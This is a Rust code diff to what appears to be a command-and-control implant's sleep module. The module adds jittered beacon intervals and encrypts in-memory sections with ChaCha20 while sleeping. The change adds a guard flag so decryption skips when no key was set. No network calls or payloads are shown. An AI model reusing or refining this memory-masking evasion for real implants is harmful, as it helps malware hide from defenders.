@@ -1,8 +1,9 @@
 use anyhow::Result;
-use common::config::{self, SleepMethod, SleepConfig};
-use log::{info, debug};
-use rand::{thread_rng, Rng, RngCore};
-use std::sync::atomic::{AtomicUsize, Ordering};
+use common::config::{SleepMethod, SleepConfig};
+use log::debug;
+#[cfg(windows)]
+use log::info;
+use rand::{thread_rng, Rng};
 
 pub fn calculate_jittered_sleep(config: &SleepConfig) -> std::time::Duration {
     let mut base = config.base_interval_secs as f64;
@@ -69,6 +70,9 @@ pub mod crypto {
 
     thread_local! {
         static SESSION_KEY: std::cell::RefCell<[u8; 32]> = std::cell::RefCell::new([0; 32]);
+        /// Set to true after a successful encrypt_sections() so decrypt_sections()
+        /// can refuse to run with a zero key.
+        static SESSION_INITIALIZED: std::cell::Cell<bool> = std::cell::Cell::new(false);
     }
 
     #[cfg(windows)]
@@ -141,10 +145,12 @@ pub mod crypto {
             return;
         }
 
+        #[cfg(not(feature = "memory-guard"))]
         unsafe {
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
             SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
+            SESSION_INITIALIZED.with(|c| c.set(true));
 
             let nonce = [0u8; 12];
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
@@ -197,7 +203,13 @@ pub mod crypto {
             return;
         }
 
+        #[cfg(not(feature = "memory-guard"))]
         unsafe {
+            if !SESSION_INITIALIZED.with(|c| c.get()) {
+                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping to avoid garbage write");
+                return;
+            }
+            SESSION_INITIALIZED.with(|c| c.set(false));
             let mut key = [0u8; 32];
             SESSION_KEY.with(|k| { key = *k.borrow(); });
 
@@ -248,6 +260,7 @@ pub mod crypto {
             let mut key = [0u8; 32];
             rand::thread_rng().fill_bytes(&mut key);
             SESSION_KEY.with(|k| { *k.borrow_mut() = key; });
+            SESSION_INITIALIZED.with(|c| c.set(true));
             let nonce = [0u8; 12];
             let mut cipher = ChaCha20::new(&key.into(), &nonce.into());
             std::ptr::write_volatile(&mut key as *mut _, [0u8; 32]);
@@ -268,6 +281,11 @@ pub mod crypto {
     pub fn decrypt_sections() {
         use chacha20::{ChaCha20, cipher::{KeyIvInit, StreamCipher}};
         unsafe {
+            if !SESSION_INITIALIZED.with(|c| c.get()) {
+                log::warn!("decrypt_sections: called without prior encrypt_sections — skipping");
+                return;
+            }
+            SESSION_INITIALIZED.with(|c| c.set(false));
             let mut key = [0u8; 32];
             SESSION_KEY.with(|k| { key = *k.borrow(); });
             let nonce = [0u8; 12];
